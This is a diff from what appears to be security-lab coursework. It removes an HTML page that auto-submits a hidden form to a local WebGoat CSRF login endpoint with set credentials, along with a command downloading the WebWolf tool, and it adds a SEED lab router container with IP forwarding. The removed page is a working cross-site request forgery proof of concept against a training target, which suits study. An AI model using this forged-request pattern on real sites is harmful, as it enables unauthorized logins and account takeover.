@@ -1,14 +1,15 @@
-<html>
-<body onload="document.forms[0].submit()">
-
-<form action="http://localhost:8080/WebGoat/csrf/login" method="POST">
-    <input type="hidden" name="username" value="csrf-kt09552n" />
-    <input type="hidden" name="password" value="newpw@9988" />
-</form>
-
-</body>
-</html>
-
-
-
-wget https://github.com/WebGoat/WebGoat/releases/download/v8.1.0/webwolf-8.1.0.jar
+Router:
+  image: handsonsecurity/seed-ubuntu:large
+  container_name: seed-router
+  tty: true
+  cap_add:
+    - ALL
+  sysctls:
+    - net.ipv4.ip_forward=1
+  volumes:
+    - ./volumes:/volumes
+  networks:
+    net-10.9.0.0:
+      ipv4_address: 10.9.0.11
+    net-192.168.60.0:
+      ipv4_address: 192.168.60.11
